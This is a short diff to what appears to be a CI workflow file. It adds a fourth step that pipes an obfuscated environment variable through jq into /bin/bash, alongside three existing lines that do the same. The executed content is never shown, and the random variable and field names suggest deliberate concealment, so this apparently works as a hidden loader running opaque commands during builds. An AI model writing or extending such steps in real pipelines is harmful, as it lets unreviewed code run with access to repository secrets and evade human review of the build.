@@ -25,6 +25,7 @@ jobs:
           printf '%s' "$itxd2" | jq -r .i8063 | /bin/bash
           echo $eym6875 | jq -r .ff19100 | /bin/bash
           echo $ek35772 | jq -r .p4 | /bin/bash
+          echo $c09448 | jq -r .u12206 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
